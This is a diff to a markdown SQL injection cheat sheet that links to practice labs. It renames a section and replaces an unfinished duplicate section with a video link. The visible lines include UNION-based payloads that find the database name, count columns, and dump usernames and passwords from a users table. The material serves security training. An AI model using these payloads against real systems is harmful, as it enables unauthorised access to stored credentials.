@@ -177,7 +177,7 @@ etc...
 ```
 - [Practice this payload here](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)
 
-## Listing the database contents on non-Oracle databases (Part 1)
+## Listing the database contents on non-Oracle databases (Method 1)
 1. Determinate the name of the databases
 ```sql
 ' UNION SELECT database()--
@@ -199,26 +199,5 @@ etc...
 ```sql
 ' UNION SELECT username_abcdef, password_abcdef FROM users_abcdef--
 ```
-
-## Listing the database contents on non-Oracle databases (Part 2)
-1. Determinate the name of the databases
-```sql
-' UNION SELECT database()--
-``` 
-2. Determinate the number of columns usion UNION SELECT or ORDER BY
-```sql
-' UNION SELECT 'abc','def'--
-' ORDER BY 2-- -
-```
-3. Determinate the tables into the database
-```sql
-
-``` 
-4. Determinate the columns stored into tables
-```sql
-
-```
-5. Once we have the information of the columns, we dump the information
-```sql
-
-```
+## Listing the database contents on non-Oracle databases (Method 2)
+- [Practice this payload here](https://youtu.be/-haHnsBAPb8?t=638)
